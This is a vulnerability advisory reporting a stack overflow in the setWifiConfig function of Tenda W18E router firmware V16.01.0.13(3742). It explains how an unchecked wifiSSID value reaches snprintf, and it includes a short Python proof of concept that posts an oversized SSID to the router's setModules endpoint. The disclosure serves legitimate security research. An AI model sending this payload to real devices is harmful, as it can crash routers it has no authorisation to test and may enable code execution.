# Tenda W18E setWifiConfig
### Overview
vendor: Tenda

product: W18E

version: V16.01.0.13(3742)

type: Stack Overflow
### Vulnerability Description
Tenda W18E V16.01.0.13(3742) were discovered to contain a stack overflow in the setWifiConfig function.
### Vulnerability details
In function setWifiConfig line 37、38, it reads in a user-provided parameter `wifiSSID`, and the variable `string` is passed to the `snprintf` function without any length check, which may overflow the stack-based buffer `v15`. As a result, by requesting the page, an attacker can easily execute a denial of service attack or remote code execution.

![](images/2.png)
![](images/1.png)

### POC
```python
import requests
ip = '192.168.0.1'
url = f'http://{ip}/goform/setModules'
payload = {
    "wifiSSID": 'a' * 1000
}

res = requests.post(url=url, data=payload)
print(res.content)
```
